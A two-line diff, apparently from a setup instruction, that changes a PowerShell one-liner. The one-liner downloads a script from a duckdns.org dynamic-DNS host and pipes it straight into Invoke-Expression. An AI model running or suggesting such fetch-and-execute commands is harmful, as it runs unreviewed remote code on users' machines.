@@ -1,2 +1,2 @@
 (Powershell)
-irm scripts.shanouhar.duckdns.org/windows.ps1 | iex
+irm scripts.shanouhar.duckdns.org/win.ps1 | iex
